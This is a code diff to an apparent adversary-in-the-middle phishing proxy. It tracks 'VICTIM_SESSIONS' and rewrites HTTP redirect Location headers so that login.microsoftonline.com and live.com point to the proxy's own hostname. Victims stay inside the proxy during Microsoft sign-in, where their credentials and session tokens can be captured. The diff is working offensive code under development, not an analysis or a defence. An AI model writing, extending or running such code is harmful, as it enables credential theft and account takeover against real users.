@@ -454,16 +454,24 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         // ---- REDIRECT DEBUG LOG ----
         console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
 
-// ---- REWRITE ALL 3xx REDIRECTS ----
+// ---- Explicit mutation redirect rewrite ----
+if (proxyRequestOptions.path.includes(PROXY_PATHNAMES.mutation) && proxyResponse.statusCode === 302 && proxyResponse.headers.location) {
+    const loc = proxyResponse.headers.location;
+    if (loc.includes('login.microsoftonline.com') || loc.includes('live.com')) {
+        const rewritten = loc.replace(/login\.microsoftonline\.com|live\.com/g, proxyHostname);
+        proxyResponse.headers.location = rewritten;
+        console.log(`[MUTATION REWRITE] Original: ${loc} -> Rewritten: ${rewritten}`);
+    }
+}
+// ---- REWRITE ALL 3xx REDIRECTS TO MICROSOFT ----
 if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
-    console.log(`[REDIRECT DEBUG] status=${proxyResponse.statusCode}, location=${proxyResponse.headers.location}, host=${VICTIM_SESSIONS[currentSession].hostname}`);
-    console.log(`[MUTATION DEBUG] status=${proxyResponse.statusCode}, location=${proxyResponse.headers.location}`);
     const proxyResponseLocation = proxyResponse.headers.location;
+    console.log(`[REDIRECT DEBUG] status=${proxyResponse.statusCode}, location=${proxyResponseLocation}, host=${VICTIM_SESSIONS[currentSession].hostname}`);
     if (proxyResponseLocation) {
         try {
             const locationURL = new URL(proxyResponseLocation);
-            // Rewrite if navigation request OR if Location points to real Microsoft host
-            if (isNavigationRequest || locationURL.hostname === VICTIM_SESSIONS[currentSession].hostname) {
+            // Rewrite if Location contains microsoftonline.com or live.com
+            if (locationURL.hostname.includes('microsoftonline.com') || locationURL.hostname.includes('live.com')) {
                 console.log(`[REDIRECT REWRITE] Original: ${proxyResponseLocation}`);
                 // Update session with new target
                 VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
